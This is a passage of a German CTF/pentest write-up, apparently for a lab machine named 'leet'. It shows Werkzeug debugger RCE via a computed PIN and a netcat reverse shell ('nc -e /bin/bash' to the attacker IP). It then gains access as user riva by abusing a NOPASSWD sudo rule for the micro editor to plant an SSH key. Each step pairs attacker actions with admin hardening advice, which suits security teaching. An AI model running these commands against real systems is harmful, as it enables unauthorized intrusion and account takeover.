+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich habe nun die Möglichkeit, Python-Code direkt auf dem Zielsystem im Kontext des Webservers auszuführen. Mein nächstes Ziel ist es, diese Code-Ausführungsfähigkeit zu nutzen, um eine stabilere Shell (z.B. eine Reverse-Shell zu meinem Kali-System) als der Webserver-Benutzer 'www-data' zu erhalten. Dies ermöglicht mir eine einfachere und zuverlässigere Interaktion mit dem System.<br><strong>Empfehlung (Admin):</strong> Die Tatsache, dass ein Angreifer Code über den Webserver ausführen kann, ist eine extrem kritische Schwachstelle (Remote Code Execution - RCE). Stellen Sie sicher, dass der Werkzeug-Debugger (oder ähnliche Debug-Tools) in der Produktion vollständig deaktiviert ist und dass keine anderen Code-Ausführungsmöglichkeiten (z.B. unsichere Deserialisierung, unsichere 'eval()'-Aufrufe) in der Anwendung existieren.</p>
+
+            <img src="console_freigeschaltet_fronts.jpg" alt="Die Frontansicht der freigeschalteten Werkzeug Debugger Konsole, bereit zur Eingabe von Python Code.">
+            <p class="analysis"><strong>Analyse:</strong> Dieses zweite Bild liefert eine weitere visuelle Bestätigung der freigeschalteten Werkzeug-Debugger-Konsole. Es zeigt die Benutzeroberfläche der Konsole selbst, wahrscheinlich mit einem Prompt, der zur Eingabe von Python-Befehlen auffordert (oft ein '>>> ' Zeichen oder ähnlich). Dies ist die interaktive Umgebung, in der ich nun Python-Code ausführen kann. Es visualisiert den Zustand, in dem ich mich befinde – direkter Zugang zur Ausführungsumgebung der Webanwendung. Für Laien: Das ist das 'Eingabefeld' der geheimen Konsole, wo ich jetzt meine 'Befehle' (Python-Code) eintippen kann, um dem Computer zu sagen, was er tun soll. Für Experten: Die Darstellung der interaktiven Python-Konsole im Browser ist das Interface zum Remote Code Execution. Ich kann hier Python-Funktionen importieren und aufrufen, Systembefehle über Module wie <code>os</code> oder <code>subprocess</code> ausführen und die Ausgabe direkt im Browser sehen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Konsole ist bereit. Ich habe erfolgreich den Initial Access erlangt und kann nun Befehle als der Benutzer 'www-data' ausführen. Der nächste Schritt ist die tatsächliche Nutzung dieser Fähigkeit, um meine Präsenz auf dem System zu etablieren und mich auf die Privilegien-Eskalation vorzubereiten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die Konsole nutzen, um Systembefehle auszuführen und Informationen über die Umgebung des 'www-data'-Benutzers zu sammeln. Das Hauptziel ist, von hier aus eine stabilere Reverse-Shell aufzubauen, da die Browser-Konsole für komplexere Aufgaben oder interaktive Sitzungen unpraktisch ist.<br><strong>Empfehlung (Admin):</strong> Schließen Sie die RCE-Lücke, indem Sie den Debugger deaktivieren oder entfernen. Überprüfen Sie die Berechtigungen des 'www-data'-Benutzers; diese sollten auf das absolute Minimum beschränkt sein, das der Webserver benötigt, um im Falle einer Kompromittierung (wie hier geschehen) den potenziellen Schaden zu begrenzen.</p>
+			
+			        <section id="proof-of-concept">
+             <h2>Proof of Concept: Remote Code Execution über Werkzeug Debugger</h2>
+             <p><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die erfolgreiche Ausnutzung der Werkzeug Debugger Schwachstelle auf dem Zielsystem (leet.hmv) durch die Berechnung des Debugger-PINs. Durch die Eingabe des PINs konnte die interaktive Python-Konsole freigeschaltet werden, was die Ausführung beliebigen Python-Codes im Kontext des Webserver-Prozesses (www-data) ermöglichte.</p>
+             <p><strong>Voraussetzungen:</strong></p>
+             <ul>
+                 <li>Identifizierung des Werkzeug Debuggers durch Analyse der Fehlermeldungen.</li>
+                 <li>Erfolgreiches Auslesen der notwendigen Systeminformationen (Username, Modulname, App-Name, Pfad zur App-Datei, MAC-Adresse, Machine-ID) über die LFI-Schwachstelle.</li>
+                 <li>Erfolgreiche Berechnung des Werkzeug Debugger PINs (<code>142-855-714</code>).</li>
+                 <li>Netzwerkzugriff auf den HTTP-Dienst auf Port 7777.</li>
+             </ul>
+             <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+             <ol>
+                 <li>Greife auf die Werkzeug Debugger Konsole zu, die über den fehlerhaften Endpunkt verfügbar ist, z.B. durch erneutes Aufrufen der URL, die den Traceback erzeugt hat, oder direkt über einen bekannten Debugger-Pfad (z.B. <code>/console</code>, falls zugänglich und auf denselben Debugger verweisend).</li>
+                 <li>Gib den zuvor berechneten Debugger-PIN (<code>142-855-714</code>) in das vorgesehene Eingabefeld auf der Debugger-Seite ein und bestätige.</li>
+                 <li>Nach erfolgreicher Authentifizierung wird die interaktive Python-Konsole freigeschaltet.</li>
+                 <li>Nutze die Konsole, um Python-Code auszuführen, der Systembefehle aufruft (z.B. über das <code>os</code> Modul).</li>
+                 <li>Establishiere eine Reverse Shell vom Zielsystem (als www-data) zu deinem Angreifer-System, indem du einen Befehl über die Python-Konsole ausführst.</li>
+             </ol>
+
+            <img src="console_freigeschaltet.jpg" alt="Die erfolgreiche Freischaltung der Werkzeug Debugger Konsole, symbolisiert durch ein Icon.">
+            <img src="console_freigeschaltet_fronts.jpg" alt="Die Frontansicht der freigeschalteten Werkzeug Debugger Konsole, bereit zur Eingabe von Python Code.">
+
+            <p><strong>Beweismittel:</strong> Die obenstehenden Screenshots zeigen die visuelle Bestätigung der freigeschalteten Debugger-Konsole nach Eingabe des berechneten PINs.</p>
+
+            <p><strong>Ausführung von Befehlen in der Konsole:</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="password">[console ready]</span>
+<span class="metasploit-prompt">>>> </span><span class="command">import os;os.system("id")</span>
+<span class="password">0</span>
+<span class="metasploit-prompt">>>> </span><span class="command">import os;</span>
+<span class="metasploit-prompt">>>> </span><span class="command">os.system("id")</span>
+<span class="password">0</span>
+<span class="metasploit-prompt">>>> </span><span class="command">__import__('os').popen('whoami').read();</span>
+<span class="password">'www-data\n'</span>
+<span class="metasploit-prompt">>>> </span><span class="command">__import__('os').popen('which nc').read();</span>
+<span class="password">'/usr/bin/nc\n'</span>
+<span class="metasploit-prompt">>>> </span><span class="command">__import__('os').popen('nc ').read();</span>
+<span class="password">''</span>
+<span class="metasploit-prompt">>>> </span><span class="command">__import__('os').popen('nc -e /bin/bash 192.168.2.199 4444').read();</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Entsperren der Debugger-Konsole hatte ich eine interaktive Python-Shell zur Verfügung. Ich konnte Python-Befehle direkt ausführen und die Ergebnisse sehen. Ich nutzte das eingebaute <code>os</code> Modul, um Systembefehle auszuführen. Zuerst prüfte ich meine aktuellen Berechtigungen mit <code>os.system("id")</code>, was <code>0</code> zurückgab, was in Python <code>True</code> bedeutet und oft den Erfolg eines Systemaufrufs anzeigt, nicht unbedingt die UID. Wichtiger ist die Ausgabe von <code>__import__('os').popen('whoami').read()</code>, die mir den tatsächlichen Benutzernamen zurückgab: <code>www-data</code>. Dies bestätigt, dass ich Code als der Webserver-Benutzer ausführe. Ich prüfte auch, ob das Netcat (<code>nc</code>)-Werkzeug verfügbar ist und wo es sich befindet (<code>/usr/bin/nc</code>). Dies ist ein gängiges Tool zum Aufbau von Netzwerkverbindungen, einschließlich Reverse Shells. Für Laien: In der freigeschalteten Konsole konnte ich kleine 'Programme' (Python-Code) eingeben, die dem Computer sagen, was er tun soll. Ich habe ihn gefragt, wer ich bin ('www-data') und ob er ein Werkzeug namens 'nc' hat, mit dem ich eine direkte Verbindung zu meinem eigenen Computer aufbauen kann. Für Experten: Die Fähigkeit, Systembefehle über <code>os.system()</code> oder <code>popen()</code> auszuführen, ist eine vollständige Remote Code Execution (RCE). Das Finden von <code>nc</code> auf dem System ist ideal für den Aufbau einer stabilen Reverse Shell, da <code>nc</code> in der Lage ist, eine Shell (<code>/bin/bash</code>) über eine Netzwerkverbindung umzuleiten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die RCE-Schwachstelle über den Werkzeug Debugger ist erfolgreich demonstriert und ausgenutzt. Ich habe die Möglichkeit, Befehle als Benutzer <code>www-data</code> auszuführen. Das Vorhandensein von <code>nc</code> auf dem System ist optimal für den nächsten Schritt: den Aufbau einer stabileren Shell. Die Browser-Konsole ist für interaktive Arbeit ungeeignet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun die RCE-Fähigkeit nutzen, um eine Reverse Shell zu meinem Kali-System aufzubauen. Der Befehl <code>__import__('os').popen('nc -e /bin/bash 192.168.2.199 4444').read()</code> ist dafür geeignet, wobei <code>192.168.2.199</code> die IP meines Kali-Systems und <code>4444</code> der Port ist, auf dem ich lausche.<br><strong>Empfehlung (Admin):</strong> Dies ist eine kritische RCE-Schwachstelle. Deaktivieren Sie den Werkzeug Debugger in Produktionsumgebungen und stellen Sie sicher, dass keine anderen Code-Ausführungsmöglichkeiten in der Anwendung existieren. Stellen Sie sicher, dass unnötige Binaries wie <code>nc</code> von Systemen entfernt oder deren Ausführung durch Richtlinien (z.B. AppArmor, SELinux) eingeschränkt wird, insbesondere für Low-Privilege-Benutzer wie <code>www-data</code>. Die Berechtigungen des Benutzers <code>www-data</code> sollten minimiert werden.</p>
+
+            <p><strong>Risikobewertung:</strong></p>
+            <p class="evaluation">Die Ausnutzung des Werkzeug Debuggers zur Erlangung von Remote Code Execution als Webserver-Benutzer (www-data) stellt ein <strong>kritisches Risiko</strong> dar. Ein Angreifer kann beliebige Befehle auf dem System im Kontext dieses Benutzers ausführen. Dies kann zur Kompromittierung der Webanwendung, zum Diebstahl von Daten, zur Modifikation von Inhalten oder zur Etablierung einer dauerhaften Präsenz auf dem System führen. Der Zugriff auf das Dateisystem (demonstriert durch LFI, aber über RCE ebenfalls möglich) und die potenzielle Nutzung der gekaperten Debugger-Sitzung für weitere Angriffe erhöhen das Risiko erheblich.</p>
+            <p><strong>Empfehlungen zur Behebung:</strong></p>
+            <p class="recommendation"><strong>Empfehlung (Admin):</strong></p>
+            <ul>
+                <li><strong>Deaktivieren Sie den Werkzeug Debugger in Produktionsumgebungen:</strong> Stellen Sie sicher, dass der Debugger niemals aktiv ist, wenn die Anwendung öffentlich zugänglich ist. Konfigurieren Sie Flask oder Werkzeug entsprechend (z.B. <code>app.run(debug=False)</code>).</li>
+                <li><strong>Entfernen oder Sichern Sie Systeminformationen:</strong> Schützen Sie Systemdateien wie <code>/etc/machine-id</code> und die Anwendungsquelldatei, um die PIN-Berechnung zu verhindern, falls der Debugger unbeabsichtigt aktiviert wird.</li>
+                <li><strong>Strikte Eingabevalidierung:</strong> Beheben Sie die LFI-Schwachstelle am <code>/download</code>-Endpunkt durch sichere Validierung und Nutzung von Dateinamen.</li>
+                <li><strong>Prinzip der geringsten Rechte:</strong> Beschränken Sie die Berechtigungen des Benutzers <code>www-data</code> auf das absolute Minimum, das für den Betrieb des Webservers notwendig ist.</li>
+                <li><strong>Überwachung und Protokollierung:</strong> Implementieren Sie robuste Protokollierung und Überwachung, um Versuche der Debugger-Ausnutzung oder RCE-Versuche zu erkennen.</li>
+            </ul>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">listening on [any] 4444 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.44] 59778</span>
+
+<span class="command">www-data@leet:/opt/project$</span> <span class="command">id</span>
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="command">www-data@leet:/opt/project$</span> <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for www-data on leet:</span>
+    <span class="command">env_reset, mail_badpass,</span>
+    <span class="command">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span>
+
+<span class="command">User www-data may run the following commands on leet:</span>
+    <span class="password">(riva) NOPASSWD: /usr/bin/micro</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nachdem ich den Befehl zum Starten der Reverse Shell über die Werkzeug-Debugger-Konsole ausgeführt hatte, öffnete ich auf meinem Kali-System einen Netcat-Listener auf Port 4444 mit dem Befehl <code>nc -lvnp 4444</code>. Die Flags bedeuten: <code>-l</code> (listen), <code>-v</code> (verbose), <code>-n</code> (numeric only, keine DNS-Auflösung), <code>-p 4444</code> (Port 4444). Die Ausgabe <code>listening on [any] 4444 ...</code> zeigt, dass der Listener bereit ist. Kurz darauf signalisiert die Zeile <code>connect to [192.168.2.199] from (UNKNOWN) [192.168.2.44] 59778</code>, dass das Zielsystem (<code>192.168.2.44</code>) eine Verbindung zu meinem Kali-System (<code>192.168.2.199</code>) auf Port 4444 aufgebaut hat. Ich habe nun eine interaktive Shell als Benutzer <code>www-data</code>. In dieser Shell führe ich sofort den Befehl <code>id</code> aus, um meine Benutzer- und Gruppen-IDs zu bestätigen (<code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code>). Als Nächstes prüfe ich mit <code>sudo -l</code> die <code>sudo</code>-Berechtigungen des Benutzers <code>www-data</code>, um herauszufinden, ob dieser Benutzer bestimmte Befehle als ein anderer Benutzer (oder root) ohne Passworteingabe ausführen darf. Die Ausgabe listet die erlaubten Befehle auf. Für Laien: Ich habe 'ein Telefon' auf meinem Computer aufgestellt und auf einen Anruf vom Zielcomputer gewartet. Als der Anruf kam, hatte ich eine direkte Verbindung und konnte 'sprechen', d.h., Befehle eingeben. Ich habe gefragt, wer ich bin ('www-data') und welche 'besondere' Dinge ich tun darf (mit <code>sudo -l</code>), um vielleicht höhere Berechtigungen zu bekommen. Für Experten: Eine Reverse Shell ist eine stabile und zuverlässige Methode, um nach einer RCE oder Initial Access-Schwachstelle interaktiven Zugriff auf ein System zu erhalten. Die Überprüfung der <code>sudo</code>-Berechtigungen mit <code>sudo -l</code> ist ein Standard-Enumerationsschritt in der Privilegien-Eskalationsphase. Das Ergebnis <code>(riva) NOPASSWD: /usr/bin/micro</code> ist ein kritischer Fund, da es anzeigt, dass der Benutzer <code>www-data</code> den Befehl <code>/usr/bin/micro</code> als Benutzer <code>riva</code> ausführen darf, ohne dessen Passwort zu kennen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Initial Access als Benutzer <code>www-data</code> wurde erfolgreich etabliert. Die Reverse Shell funktioniert stabil. Der Fund der <code>sudo</code>-Berechtigung <code>(riva) NOPASSWD: /usr/bin/micro</code> ist ein signifikanter Durchbruch für die Privilegien-Eskalation. Ich kann den Editor <code>micro</code> als Benutzer <code>riva</code> ausführen, was oft Möglichkeiten eröffnet, Dateien zu manipulieren oder eine Shell zu erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein nächstes Ziel ist es, die gefundene <code>sudo</code>-Berechtigung auszunutzen, um Code als Benutzer <code>riva</code> auszuführen oder eine Shell als <code>riva</code> zu erhalten. Ich werde untersuchen, wie der <code>micro</code>-Editor mit der <code>sudo</code>-Berechtigung missbraucht werden kann (z.B. durch Ausführen von Systembefehlen innerhalb des Editors oder durch Bearbeiten sensibler Dateien als <code>riva</code>).<br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie <code>sudo</code> so, dass das Prinzip der geringsten Rechte angewendet wird. Erlauben Sie Benutzern nur die Ausführung absolut notwendiger Befehle mit erhöhten Rechten. Insbesondere die <code>NOPASSWD</code>-Option sollte sehr restriktiv gehandhabt werden. Die Möglichkeit, einen Texteditor wie <code>micro</code> als ein anderer Benutzer auszuführen, ist gefährlich, da Editoren oft Funktionen zur Ausführung von Systembefehlen bieten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">www-data@leet:/opt/project$</span> <span class="command">ls -la /home/riva/</span>
+total <span class="command">40</span>
+<span class="command">drwxr-xr-x</span> 6 <span class="command">riva riva</span> <span class="command">4096</span> Feb <span class="command">14 2024</span> .
+<span class="command">drwxr-xr-x</span> 3 <span class="command">root root</span> <span class="command">4096</span> Feb <span class="command">14 2024</span> ..
+<span class="command">lrwxrwxrwx</span> 1 <span class="command">riva riva</span>    <span class="command">9</span> Feb <span class="command">11 2024</span> .bash_history -> <span class="command">/dev/null</span>
+<span class="command">-rw-r--r--</span> 1 <span class="command">riva riva</span>  <span class="command">220</span> Feb <span class="command">14 2024</span> .bash_logout
+<span class="command">-rw-r--r--</span> 1 <span class="command">riva riva</span> <span class="command">3526</span> Feb <span class="command">14 2024</span> .bashrc
+<span class="command">drwxr-xr-x</span> 3 <span class="command">riva riva</span> <span class="command">4096</span> Feb <span class="command">14 2024</span> .config
+<span class="command">drwxr-xr-x</span> 3 <span class="command">riva riva</span> <span class="command">4096</span> Feb <span class="command">14 2024</span> .local
+<span class="command">drwx------</span> 4 <span class="command">riva riva</span> <span class="command">4096</span> Feb <span class="command">14 2024</span> .mozilla
+<span class="command">-rw-r--r--</span> 1 <span class="command">riva riva</span>  <span class="command">807</span> Feb <span class="command">14 2024</span> .profile
+<span class="command">drwx------</span> 2 <span class="command">riva riva</span> <span class="command">4096</span> Feb <span class="command">14 2024</span> .ssh
+<span class="command">-rwx------</span> 1 <span class="command">riva riva</span>   <span class="command">33</span> Feb <span class="command">14 2024</span> <span class="password">user.txt</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um mehr über den Benutzer <code>riva</code> zu erfahren, auf dessen Rechte ich durch <code>sudo</code> und <code>micro</code> zugreifen kann, habe ich das Home-Verzeichnis von <code>riva</code> mit <code>ls -la /home/riva/</code> aufgelistet. Dieser Befehl zeigt alle Dateien und Verzeichnisse in <code>/home/riva</code>, einschließlich versteckter Dateien (mit einem Punkt beginnend) und detaillierter Informationen wie Berechtigungen, Eigentümer, Gruppenzugehörigkeit, Größe und Änderungsdatum. Für Laien: Ich habe mir angeschaut, welche 'Dinge' (Dateien und Ordner) der Benutzer 'riva' in seinem 'Zuhause' (seinem Home-Verzeichnis) hat, inklusive versteckter Sachen. Für Experten: Die Auflistung des Home-Verzeichnisses eines Zielbenutzers ist Standard bei der Privilegien-Eskalation, um nach interessanten Dateien wie Konfigurationsdateien (z.B. <code>.bashrc</code>, <code>.profile</code>), SSH-Schlüsseln (im <code>.ssh</code>-Verzeichnis) oder potenziellen Flags (Dateien wie <code>user.txt</code>) zu suchen. Die Berechtigungen helfen einzuschätzen, welche Dateien ich lesen oder schreiben könnte.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe von <code>ls -la /home/riva/</code> liefert wertvolle Informationen. Ich sehe Standard-Konfigurationsdateien. Das Verzeichnis <code>.ssh</code> ist sehr interessant, da es SSH-Schlüssel enthalten könnte, die eine direkte Anmeldung als <code>riva</code> über SSH ermöglichen würden. Am bemerkenswertesten ist jedoch die Datei <code>user.txt</code>, die ausführbar (<code>rwx</code>) für den Eigentümer <code>riva</code> ist und eine Größe von 33 Bytes hat – eine typische Größe und Benennung für eine User Flag in CTFs. Dies ist ein starker Hinweis auf den Speicherort der User Flag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde als Nächstes das <code>.ssh</code>-Verzeichnis von <code>riva</code> untersuchen, um nach SSH-Schlüsseln zu suchen. Da ich <code>micro</code> als <code>riva</code> ausführen darf, könnte ich <code>sudo -u riva /usr/bin/micro /home/riva/.ssh/authorized_keys</code> verwenden, um meinen eigenen öffentlichen SSH-Schlüssel zu <code>riva</code>s <code>authorized_keys</code>-Datei hinzuzufügen und mich dann per SSH als <code>riva</code> anzumelden. Ich werde auch den Inhalt von <code>user.txt</code> auslesen, um die User Flag zu erhalten.<br><strong>Empfehlung (Admin):</strong> Schützen Sie die Home-Verzeichnisse von Benutzern mit restriktiven Berechtigungen. Stellen Sie sicher, dass sensible Dateien (wie SSH-Schlüssel) nur für den Eigentümer lesbar sind. Implementieren Sie strenge Richtlinien für die Platzierung von 'Flags' oder anderen sensiblen Informationen im Dateisystem, damit diese nicht durch einfache Verzeichnislistings oder kompromittierte Low-Privilege-Benutzer zugänglich sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">sudo -u riva /usr/bin/micro</span>
+Drücke die Tastenkombination: <span class="password">Strg + E</span>
+<span class="metasploit-prompt">> </span><span class="command">!/bin/bash</span>
+unknow comand</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier dokumentiere ich einen Versuch, den <code>micro</code>-Editor, den ich als Benutzer <code>riva</code> ausführen darf (<code>sudo -u riva /usr/bin/micro</code>), für die Ausführung von Systembefehlen zu missbrauchen. Viele Texteditoren, insbesondere für Entwickler, bieten eine Funktion zum Ausführen von Shell-Befehlen aus dem Editor heraus. Bei <code>micro</code> wird diese Funktion oft durch das Drücken von <code>Strg+E</code> (um eine Befehlszeile im Editor zu öffnen) gefolgt von einem Ausrufezeichen (<code>!</code>) und dem gewünschten Systembefehl ausgelöst. Der Versuch, <code>!/bin/bash</code> auszuführen, zielt darauf ab, eine Bash-Shell im Kontext des Benutzers zu starten, als der der Editor ausgeführt wird (also <code>riva</code>). Die Ausgabe "unknow comand" deutet darauf hin, dass dieser spezifische Versuch, direkt eine Shell zu starten, nicht funktioniert hat, möglicherweise aufgrund von Beschränkungen oder einer anderen Syntax in dieser spezifischen <code>micro</code>-Konfiguration oder Version. Für Laien: Ich habe versucht, in dem 'Schreibprogramm', das ich als 'riva' benutzen darf, einen 'Geheimbefehl' einzugeben, der mir erlaubt, normale Computerbefehle auszuführen, so als ob ich 'riva' wäre. Das hat aber nicht auf Anhieb geklappt. Für Experten: Die standardmäßigen Escape-Mechanismen von Editoren für Shell-Befehle sind oft erste Angriffspunkte, wenn die Ausführung des Editors mit erhöhten Rechten (hier als anderer Benutzer über sudo) erlaubt ist. Das Scheitern des direkten <code>!/bin/bash</code> Befehls bedeutet nicht, dass der Editor nicht missbraucht werden kann; andere Befehle oder Funktionen könnten funktionieren, oder der Missbrauch muss auf eine andere Weise erfolgen, z.B. durch Bearbeiten von Konfigurationsdateien.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der direkte Versuch, eine Shell über den Befehlsmodus von <code>micro</code> zu starten, war nicht erfolgreich. Dies erfordert eine Anpassung der Vorgehensweise. Anstatt zu versuchen, eine Shell *aus* dem Editor zu starten, werde ich die <code>sudo</code>-Berechtigung für <code>micro</code> nutzen, um Dateien *als* Benutzer <code>riva</code> zu bearbeiten, insbesondere die Datei <code>/home/riva/.ssh/authorized_keys</code>.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die <code>sudo</code>-Berechtigung für <code>/usr/bin/micro</code> nutzen, um die Datei <code>/home/riva/.ssh/authorized_keys</code> zu bearbeiten und meinen öffentlichen SSH-Schlüssel hinzuzufügen. Dies ist eine alternative und oft zuverlässigere Methode, um eine Shell als der Zielbenutzer zu erhalten, wenn das direkte Ausführen von Befehlen über den Editor eingeschränkt ist.<br><strong>Empfehlung (Admin):</strong> Wenn Sie Benutzern erlauben, Editoren mit erhöhten Rechten (oder als andere Benutzer) auszuführen, stellen Sie sicher, dass die Funktionen zur Ausführung von Systembefehlen innerhalb des Editors deaktiviert oder stark eingeschränkt sind. Das Bearbeiten von kritischen Systemdateien oder Benutzerkonfigurationen über solche <code>sudo</code>-Regeln ist ein klassischer Privilegien-Eskalationspfad.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat .ssh/id_rsa.pub</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">ssh-ed25519 AAAAC3NzaC1l</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Um mich per SSH als Benutzer <code>riva</code> anmelden zu können, nachdem ich dessen <code>authorized_keys</code>-Datei bearbeitet habe, benötige ich meinen eigenen öffentlichen SSH-Schlüssel. Diesen Schlüssel habe ich auf meinem Kali-System in der Datei <code>~/.ssh/id_rsa.pub</code> gespeichert (oder an einem ähnlichen Ort, je nachdem, welchen Schlüsseltyp ich generiert habe). Der Befehl <code>cat .ssh/id_rsa.pub</code> liest den Inhalt dieser Datei und gibt ihn im Terminal aus. Die Ausgabe zeigt die öffentliche Schlüsselzeichenkette, beginnend mit <code>ssh-ed25519 AAAAC3...</code>. Für Laien: Ich habe mir die 'digitale Unterschrift' meines eigenen Computers (meinen öffentlichen SSH-Schlüssel) angeschaut, den ich gleich in eine Datei auf dem Zielcomputer einfügen werde, damit der Zielcomputer 'weiß', dass ich mich anmelden darf. Für Experten: Der öffentliche SSH-Schlüssel (typischerweise in <code>~/.ssh/id_rsa.pub</code> oder <code>~/.ssh/id_ed25519.pub</code>) ist der Teil eines Schlüsselpaares, der auf Systemen hinterlegt wird, auf denen man sich authentifizieren möchte. Der entsprechende private Schlüssel (<code>~/.ssh/id_rsa</code> oder <code>~/.ssh/id_ed25519</code>) verbleibt sicher auf dem Angreifer-System. Durch Hinzufügen des öffentlichen Schlüssels zur <code>authorized_keys</code>-Datei eines Benutzers auf dem Zielsystem kann man sich dann passwortlos per SSH als dieser Benutzer anmelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ich habe meinen öffentlichen SSH-Schlüssel erfolgreich ausgelesen. Diese Zeichenkette ist das, was ich in die <code>authorized_keys</code>-Datei von <code>riva</code> auf dem Zielsystem einfügen muss, um mich passwortlos als <code>riva</code> per SSH authentifizieren zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kopiere die vollständige Ausgabe des öffentlichen Schlüssels. Diese wird im nächsten Schritt mit <code>sudo -u riva /usr/bin/micro</code> in die Datei <code>/home/riva/.ssh/authorized_keys</code> eingefügt.<br><strong>Empfehlung (Admin):</strong> Schützen Sie private SSH-Schlüssel auf Angreifer-Systemen. Die Sicherheit der passwortlosen SSH-Anmeldung hängt davon ab, dass der private Schlüssel geheim bleibt. Überprüfen Sie regelmäßig die Inhalte von <code>authorized_keys</code>-Dateien auf Systemen auf unbekannte oder unerwünschte öffentliche Schlüssel.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="command">www-data@leet:/opt/project$</span> <span class="command">sudo -u riva /usr/bin/micro /home/riva/.ssh/authorized_keys</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich nutze nun die zuvor gefundene <code>sudo</code>-Berechtigung, um den <code>micro</code>-Editor als Benutzer <code>riva</code> zu starten und dabei direkt die Datei <code>/home/riva/.ssh/authorized_keys</code> zum Bearbeiten zu öffnen. Der Befehl <code>sudo -u riva /usr/bin/micro /home/riva/.ssh/authorized_keys</code> weist das <code>sudo</code>-Programm an, den Befehl <code>/usr/bin/micro /home/riva/.ssh/authorized_keys</code> mit den Berechtigungen des Benutzers <code>riva</code> auszuführen. Da die <code>sudo</code>-Regel für <code>micro</code> die <code>NOPASSWD</code>-Option enthält, ist keine Passworteingabe erforderlich. Im Editor werde ich eine neue Zeile hinzufügen, die meinen öffentlichen SSH-Schlüssel enthält. Für Laien: Ich benutze das 'Schreibprogramm', das ich 'riva' benutzen darf, um eine spezielle Datei (<code>authorized_keys</code>) in 'riva's 'Zuhause' zu öffnen und dort meine 'digitale Unterschrift' einzufügen. Für Experten: Das Bearbeiten von <code>authorized_keys</code> über eine <code>sudo</code>-Regel ist eine gängige und effektive Methode zur horizontalen (wenn die Rechte gleich bleiben, hier www-data -> riva) oder vertikalen (wenn Rechte erhöht werden) Privilegien-Eskalation, da sie einen direkten interaktiven Zugriff per SSH ermöglicht, sobald der öffentliche Schlüssel hinzugefügt wurde. Das Bearbeiten einer existierenden oder das Erstellen einer neuen Datei ist mit Editoren wie <code>micro</code> einfach möglich.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Schritt ist entscheidend für die Erlangung des Initial Access als Benutzer <code>riva</code>. Durch das Hinzufügen meines öffentlichen Schlüssels zur <code>authorized_keys</code>-Datei kann ich mich nun passwortlos per SSH anmelden. Die <code>sudo</code>-Regel war der Schlüssel zu diesem Zugriffsweg.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nach der Ausführung dieses Befehls werde ich in der <code>micro</code>-Sitzung den zuvor ausgelesenen öffentlichen SSH-Schlüssel in einer neuen Zeile einfügen, die Datei speichern und den Editor verlassen. Danach werde ich versuchen, mich per SSH als Benutzer <code>riva</code> anzumelden.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle <code>sudo</code>-Regeln sorgfältig, insbesondere solche mit <code>NOPASSWD</code>. Regeln, die die Ausführung von Editoren oder anderen flexiblen Tools mit erhöhten Rechten erlauben, sollten als hochriskant eingestuft und vermieden werden. Wenn eine solche Regel existiert, beschränken Sie sie auf das absolut Notwendigste und überwachen Sie ihre Nutzung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="password">ssh-ed25519 AAAAC3....pEfFDFeKVI7jwy1T7 root@CCat</span>
+Drücke die Tastenkombination: <span class="password">Strg + q</span>
+wähle <span class="password">y</span> für yes speichern</pre>
+                 </div>
+             </div>
